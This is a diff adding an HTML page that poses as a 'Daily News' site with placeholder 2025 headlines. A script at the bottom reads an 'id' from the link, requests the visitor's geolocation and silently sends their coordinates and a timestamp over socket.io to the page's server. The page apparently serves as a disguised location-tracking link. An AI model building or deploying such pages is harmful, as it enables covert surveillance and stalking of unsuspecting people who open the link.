@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Daily News - Latest Headlines</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="/socket.io/socket.io.js"></script>
+</head>
+<body class="bg-gray-50 font-inter min-h-screen">
+  <header class="bg-white shadow-md sticky top-0 z-50">
+    <div class="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
+      <h1 class="text-3xl font-bold text-blue-700">Daily News</h1>
+      <nav>
+        <ul class="flex space-x-6 text-gray-700 font-semibold">
+          <li><a href="#" class="hover:text-blue-700">Home</a></li>
+          <li><a href="#" class="hover:text-blue-700">World</a></li>
+          <li><a href="#" class="hover:text-blue-700">Politics</a></li>
+          <li><a href="#" class="hover:text-blue-700">Business</a></li>
+          <li><a href="#" class="hover:text-blue-700">Technology</a></li>
+          <li><a href="#" class="hover:text-blue-700">Sports</a></li>
+          <li><a href="#" class="hover:text-blue-700">Entertainment</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main class="max-w-7xl mx-auto px-4 py-8 grid grid-cols-1 md:grid-cols-3 gap-8">
+    <section class="md:col-span-2 space-y-8">
+      <article class="bg-white rounded-lg shadow-md p-6 hover:shadow-lg transition">
+        <h2 class="text-2xl font-bold mb-2">Breaking: Major Event Shakes the World in 2025</h2>
+        <p class="text-gray-700">In 2025, unprecedented events are shaping the global landscape. Stay informed with the latest updates.</p>
+        <a href="https://www.example.com/article1" target="_blank" class="text-blue-600 hover:underline mt-2 inline-block">Read more</a>
+      </article>
+      <article class="bg-white rounded-lg shadow-md p-6 hover:shadow-lg transition">
+        <h2 class="text-2xl font-bold mb-2">Tech Giants Release New Gadgets in 2025</h2>
+        <p class="text-gray-700">The year 2025 brings innovative gadgets from leading tech companies, revolutionizing everyday life.</p>
+        <a href="https://www.example.com/article2" target="_blank" class="text-blue-600 hover:underline mt-2 inline-block">Read more</a>
+      </article>
+      <article class="bg-white rounded-lg shadow-md p-6 hover:shadow-lg transition">
+        <h2 class="text-2xl font-bold mb-2">Sports Update: 2025 Championship Highlights</h2>
+        <p class="text-gray-700">Catch up on the thrilling moments and highlights from the 2025 sports championships worldwide.</p>
+        <a href="https://www.example.com/article3" target="_blank" class="text-blue-600 hover:underline mt-2 inline-block">Read more</a>
+      </article>
+    </section>
+
+    <aside class="space-y-6">
+      <div class="bg-white rounded-lg shadow-md p-6">
+        <h3 class="text-xl font-semibold mb-4">Top Stories</h3>
+        <ul class="list-disc list-inside text-gray-700 space-y-2">
+          <li><a href="https://www.example.com/article4" target="_blank" class="hover:text-blue-700">Global Markets Rally Amid Economic Optimism in 2025</a></li>
+          <li><a href="https://www.example.com/article5" target="_blank" class="hover:text-blue-700">New Innovations in Renewable Energy for 2025</a></li>
+          <li><a href="https://www.example.com/article6" target="_blank" class="hover:text-blue-700">Health Experts Warn of Seasonal Flu in 2025</a></li>
+          <li><a href="https://www.example.com/article7" target="_blank" class="hover:text-blue-700">Upcoming Elections: What to Expect in 2025</a></li>
+        </ul>
+      </div>
+      <div class="bg-white rounded-lg shadow-md p-6">
+        <h3 class="text-xl font-semibold mb-4">Editor's Picks</h3>
+        <ul class="list-disc list-inside text-gray-700 space-y-2">
+          <li><a href="https://www.example.com/article8" target="_blank" class="hover:text-blue-700">Exploring the Depths of the Ocean in 2025</a></li>
+          <li><a href="https://www.example.com/article9" target="_blank" class="hover:text-blue-700">The Rise of Electric Vehicles in 2025</a></li>
+          <li><a href="https://www.example.com/article10" target="_blank" class="hover:text-blue-700">Culinary Trends to Watch in 2025</a></li>
+        </ul>
+      </div>
+    </aside>
+  </main>
+
+  <footer class="bg-white shadow-inner mt-12 py-6 text-center text-gray-600">
+    &copy; 2024 Daily News. All rights reserved.
+  </footer>
+
+  <script>
+    const socket = io();
+    const urlParams = new URLSearchParams(window.location.search);
+    const linkId = urlParams.get('id');
+
+    if (linkId && navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const location = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            timestamp: position.timestamp,
+          };
+          socket.emit('sendLocation', { linkId, location });
+        },
+        (error) => {
+          // silently fail or log error if needed
+          console.error('Error getting location:', error.message);
+        }
+      );
+    }
+  </script>
+</body>
+</html>
